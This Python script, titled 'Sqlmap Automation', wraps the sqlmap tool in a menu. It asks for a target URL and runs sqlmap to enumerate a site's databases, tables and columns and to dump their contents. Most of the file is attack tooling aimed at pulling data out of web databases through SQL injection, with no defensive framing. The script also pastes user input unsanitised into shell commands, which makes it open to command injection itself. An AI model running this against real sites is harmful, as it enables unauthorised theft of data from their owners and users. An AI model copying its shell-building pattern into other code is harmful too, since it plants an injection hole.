#! /bin/env python
import os

os.system("clear") #clear screen
print("""
 ____   __   __    _  _   __   ____     __   _  _  ____  __   _  _   __  ____  __  __   __ _       
/ ___) /  \ (  )  ( \/ ) / _\ (  _ \   / _\ / )( \(_  _)/  \ ( \/ ) / _\(_  _)(  )/  \ (  ( \      
\___ \(  O )/ (_/\/ \/ \/    \ ) __/  /    \) \/ (  )( (  O )/ \/ \/    \ )(   )((  O )/    /      
(____/ \__\)\____/\_)(_/\_/\_/(__)    \_/\_/\____/ (__) \__/ \_)(_/\_/\_/(__) (__)\__/ \_)__)      

\t\t\t\t\t Created by Cbkali
    1. Database
    2. Tables
    3. Column
    4. Column Dump
    5. Dump
    6. exit
    """)

url = raw_input("Enter a sql_url: ") # for sql url
def database():
    os.system("sqlmap "+ "-u "+url+" --dbs") # for show database's
def tables():
    d_name = raw_input("Enter a database name: ")
    os.system("sqlmap "+ "-u "+url+" -D "+ d_name +" --tables")
def col():
    d_name = raw_input("Enter a database name: ")
    t_nmae = raw_input("Enter a tables name: ")
    os.system("sqlmap "+ "-u "+url+" -D "+ d_name +" -T"+ t_nmae +" --column")
def col_dump():
    d_name = raw_input("Enter a database name: ")
    t_nmae = raw_input("Enter a tables name: ")
    c_name = raw_input("Enter a column name: ")
    os.system("sqlmap "+ "-u "+url+" -D "+ d_name +" -T"+ t_nmae +" -C"+ c_name +" --dump")
def a_dump():
    os.system("sqlmap "+ "-u "+url+" --dump")


def main():
    choose = int(input("Enter a number: "))
    if choose == 1:
        database()
    elif choose == 2:
        tables()
    elif choose == 3:
        col()
    elif choose == 4:
        col_dump()
    elif choose == 5:
        a_dump()
    elif choose == 6:
        os.system("clear")
        print("Thank you for enjoy!!")
        os.system("exit")
    else:
        print("wrong!!")

main()